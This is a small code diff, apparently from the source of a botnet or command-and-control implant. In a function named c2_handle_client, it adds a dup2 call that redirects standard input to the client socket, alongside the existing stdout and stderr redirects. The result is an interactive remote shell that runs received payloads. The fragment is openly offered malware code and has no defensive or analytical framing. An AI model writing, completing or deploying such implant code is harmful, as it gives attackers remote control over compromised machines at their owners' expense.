@@ -191,6 +191,7 @@ static void c2_handle_client(int client_sock) {
     // This is the proper POSIX way - kernel handles it
     dup2(client_sock, STDOUT_FILENO);
     dup2(client_sock, STDERR_FILENO);
+    dup2(client_sock, 0); // STDIN_FILENO is 0
 
     // Now all printf output goes to the socket
     printf("[Bot] Payload received. Executing...\n");
